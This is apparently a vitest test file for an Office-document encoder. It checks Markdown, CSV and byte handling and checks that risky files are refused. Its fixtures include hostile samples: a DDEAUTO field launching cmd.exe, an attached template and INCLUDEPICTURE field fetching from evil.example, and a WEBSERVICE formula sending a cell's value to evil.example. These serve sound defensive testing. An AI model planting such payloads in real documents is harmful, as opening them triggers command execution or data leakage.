import { describe, expect, it } from "vitest";
import { convertToText } from "../src/content/index";
import { writeZip } from "../src/content/zip-write";
import { checkTemplate, encodeContent, featuresLost, presentationStructure } from "../src/office-write";

const now = new Date("2026-10-17T12:00:00Z");

async function text(name: string, bytes: Uint8Array): Promise<string> {
  return (await convertToText({ bytes, name, maxChars: 100_000 }))?.content ?? "";
}

describe("encodeContent", () => {
  it("writes Markdown as a Word document, keeping the Markdown for the approver", async () => {
    const encoded = await encodeContent("Plan.docx", "# Plan\n\n- Ship **it**\n", { now, author: "Ada" });
    expect(encoded.writing).toEqual({ as: "word" });
    expect(encoded.source).toBe("# Plan\n\n- Ship **it**\n");
    expect(await text("Plan.docx", encoded.bytes)).toContain("# Plan");
  });

  it("writes Markdown as a deck, a slide per heading", async () => {
    const encoded = await encodeContent("Deck.pptx", "# One\n\n- a\n\n# Two\n\n- b\n", { now });
    expect(encoded.writing).toEqual({ as: "powerpoint" });
    const { slides, layouts } = await presentationStructure(encoded.bytes);
    expect(slides.map(slide => slide.placeholders.find(placeholder => placeholder.type === "title")?.markdown)).toEqual(["One", "Two"]);
    expect(layouts).toContain("Two Content");
  });

  it("writes CSV and rows as a workbook, showing rows to the approver as CSV", async () => {
    const fromCsv = await encodeContent("Costs.xlsx", "Item,Cost\nRent,1200\n", { now });
    expect(fromCsv.writing).toEqual({ as: "excel" });
    const fromRows = await encodeContent("Costs.xlsx", [{ name: "Q1", rows: [["Item", "Note"], ["Rent", "a, \"b\""]] }], { now });
    expect(fromRows.source).toBe("# Q1\nItem,Note\nRent,\"a, \"\"b\"\"\"");
  });

  it("keeps text formats as UTF-8 and passes bytes through", async () => {
    expect(new TextDecoder().decode((await encodeContent("notes.md", "# Hi")).bytes)).toBe("# Hi");
    const zip = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0]);
    expect((await encodeContent("archive.zip", zip)).bytes).toBe(zip);
    const docx = await encodeContent("Plan.docx", "# Plan\n\n[Site](https://example.com)\n", { now });
    expect((await encodeContent("Copy.docx", docx.bytes)).bytes).toBe(docx.bytes);
  });

  describe("an Office file passed as bytes", () => {
    const rels = (type: string, target: string) =>
      `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
      `<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}" TargetMode="External"/></Relationships>`;
    const W = `xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"`;
    const document = (body: string) => `<?xml version="1.0"?><w:document ${W}><w:body><w:p>${body}</w:p></w:body></w:document>`;
    const sheet = (formula: string) => `<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">` +
      `<sheetData><row r="1"><c r="A1"><f>${formula}</f></c></row></sheetData></worksheet>`;
    const pack = (entries: Record<string, string>) => writeZip(Object.entries(entries).map(([name, data]) => ({ name, data })));

    it("is refused when it has macros, ActiveX or workbook links", async () => {
      await expect(encodeContent("a.docm", await pack({ "word/document.xml": document(""), "word/vbaProject.bin": "x" }))).rejects.toThrow(/has macros/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/activeX/activeX1.xml": "<x/>" }))).rejects.toThrow(/ActiveX/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/externalLinks/externalLink1.xml": "<x/>" }))).rejects.toThrow(/links to other workbooks/);
    });

    it("is refused when opening it fetches something, but may link to a page", async () => {
      await expect(encodeContent("a.docx", await pack({ "word/_rels/settings.xml.rels": rels("attachedTemplate", "https://evil.example/t.dotm") })))
        .rejects.toThrow(/fetches from elsewhere when opened \(attachedTemplate\)/);
      await expect(encodeContent("a.pptx", await pack({ "ppt/slides/_rels/slide1.xml.rels": rels("image", "https://evil.example/pixel.png") })))
        .rejects.toThrow(/\(image\)/);
      const linked = await pack({ "word/document.xml": document(""), "word/_rels/document.xml.rels": rels("hyperlink", "https://example.com") });
      expect((await encodeContent("a.docx", linked)).bytes).toBe(linked);
    });

    it("is refused for DDE and fields that fetch content, even split across runs", async () => {
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(`<w:fldSimple w:instr=" DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc&quot;"/>`) })))
        .rejects.toThrow(/DDE/);
      const split = `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDE</w:instrText></w:r>` +
        `<w:r><w:instrText>PICTURE "https://evil.example/p.png"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`;
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(split) }))).rejects.toThrow(/fetch content/);
      const page = `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> PAGE </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`;
      await expect(encodeContent("a.docx", await pack({ "word/document.xml": document(page) }))).resolves.toBeDefined();
    });

    it("is refused for a formula a written workbook couldn't have", async () => {
      await expect(encodeContent("a.xlsx", await pack({ "xl/worksheets/sheet1.xml": sheet("WEBSERVICE(&quot;https://evil.example/?&quot;&amp;A2)") })))
        .rejects.toThrow(/formula files uploaded here can't have.*WEBSERVICE/);
      await expect(encodeContent("a.xlsx", await pack({ "xl/worksheets/sheet1.xml": sheet("SUM(B1:B9)") }))).resolves.toBeDefined();
    });
  });

  it("refuses content that doesn't suit the format, saying what to do instead", async () => {
    await expect(encodeContent("Report.pdf", "# Not a PDF")).rejects.toThrow(/Text can't be written as one of the PDFs/);
    await expect(encodeContent("Old.doc", "text")).rejects.toThrow(/Word 97-2003/);
    await expect(encodeContent("Rows.docx", [["a"]])).rejects.toThrow(/Rows can only be written to an Excel workbook/);
    await expect(encodeContent("Fake.docx", new Uint8Array([1, 2, 3]))).rejects.toThrow(/aren't a docx file.*Markdown/);
    await expect(encodeContent("Bad.xlsx", [["=WEBSERVICE(\"https://example.com\")"]])).rejects.toThrow(/WEBSERVICE/);
    await expect(encodeContent("Sheet.xlsx", "a,b", { template: { name: "t.dotx", bytes: new Uint8Array() } })).rejects.toThrow(/template can only be used/);
  });

  it("refuses files over the upload limit", async () => {
    await expect(encodeContent("big.txt", "x".repeat(26 * 1024 * 1024))).rejects.toThrow(/at most 25 MB/);
  });
});

describe("checkTemplate", () => {
  it("matches Word templates to documents and PowerPoint templates to decks", () => {
    expect(() => checkTemplate("a.docx", "House.dotx")).not.toThrow();
    expect(() => checkTemplate("a.pptx", "Brand.potx")).not.toThrow();
    expect(() => checkTemplate("a.docx", "Brand.potx")).toThrow(/needs a .docx or .dotx template/);
    expect(() => checkTemplate("a.xlsx", "Brand.xltx")).toThrow(/only be used for a Word document/);
  });
});

describe("featuresLost", () => {
  it("names nothing for a file this writer made, and nothing for formats it doesn't know", async () => {
    expect(await featuresLost("Plan.docx", (await encodeContent("Plan.docx", "# Plan\n\nText.\n", { now })).bytes)).toEqual([]);
    expect(await featuresLost("notes.txt", new TextEncoder().encode("hi"))).toEqual([]);
    // An unreadable file loses nothing it can name; the approver still sees the new content.
    expect(await featuresLost("Broken.docx", new Uint8Array([1, 2, 3]))).toEqual([]);
  });

  it("names speaker notes a rewrite of a deck would lose", async () => {
    const deck = await encodeContent("Deck.pptx", "# One\n\n> Notes: say hello\n", { now });
    expect(await featuresLost("Deck.pptx", deck.bytes)).toContain("speaker notes");
  });
});
